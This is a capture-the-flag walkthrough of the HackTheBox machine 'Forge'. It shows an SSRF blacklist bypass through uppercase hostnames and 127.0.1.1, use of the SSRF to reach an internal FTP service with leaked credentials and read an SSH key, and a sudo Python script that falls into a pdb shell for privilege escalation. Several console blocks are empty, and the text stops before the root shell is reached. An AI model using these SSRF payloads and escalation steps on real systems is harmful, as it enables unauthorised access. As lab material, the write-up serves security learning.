## Summary
This was an interesting box, which is centered around a SSRF vulnerability being exploited into reading otherwise unaccessible web pages. Once a foothold has been established however, it is rather straight forward to obtain a root shell.

## Foothold
We start out as usual with a nmap port scan.
```console

We have 3 ports open. 21 which is hosting a filtered ftp service, along with port 22 and 80. It is usually a good idea to check for vhosts via gobuster as well when a box is hosting a web application. 

```console

```
We have found another vhost. Let's add it to the host file and check out both sites. 
![The welcome pain for forge.htb](main_dom.png)
![The page for admin.forge.htb](admin_dom.png)
The admin page only allows us to access it via localhost. Checking out the upload tab for the main site we see that we can upload images from an url.
![The upload tab](upload.png)
If attempt to upload an image hosted at `http://admin.forge.htb` we get told the adress is blacklisted.
![](blacklist.png)
However, internet adresses are only case sensitive for anything after the domain name, meaning if we submit the url `http://ADMIN.FORGE.HTB` it will point towards the same site. Doing this successfully sidesteps the blacklist.
![Successfully received an image of the admin.forge.htb page](success.png)
If we follow the link we get told the image can't be displayed since it contains errors. Using curl to get the address instead gives us the HTML code for the admin page.
```console

```
As we can tell, the page also contains an announcement directory. Let's take a look through the same functionality. 
```console

    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>                                                     
```
We now have credentials for the ftp service, however we can't use them to login since the port is filtered. However, ftp services can also be accessed through most browsers with the format `ftp://FTP_Username:FTP_Password@Host`. We can use the upload functionality described above to upload the contents of the ftp directory. However, if we attempt to to use the url `http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@127.0.0.1`, we get told it contains a blacklisted adress, most likely 127.0.0.1. If we use another url like `http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@127.0.1.1` we get through though.

We now have access to the user users home directory. To get a foothold on the system we can read the contents of their `.ssh` folder to get their ssh key.

## Privilege escalation
Once in, we can run `sudo -l`, which reveals that we can run a python script as root. 
```console
user@forge:~$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```
The content of the script can be found below.
```python
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```
The creates a listener on a random local port in the range 1025-65535. Once connected we will be prompted for an admin password which is luckily hardcoded into the script in plaintext. If we give it an input it doesn't expect it will drop us into a [python debugger](https://docs.python.org/3/library/pdb.html) shell. We can then use the techniques outlinede [here](https://gtfobins.github.io/gtfobins/pdb/) to escalate our privileges. The output can be seen below

```console
user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py 
Listening on localhost:59884
```

```console
user@forge:~$ nc localhost 59884
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
```
If we enter  some nonsense input in our netcat listener the pdb shell will open on in the session running the script:

```console
user@forge:~$ nc localhost 59884
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
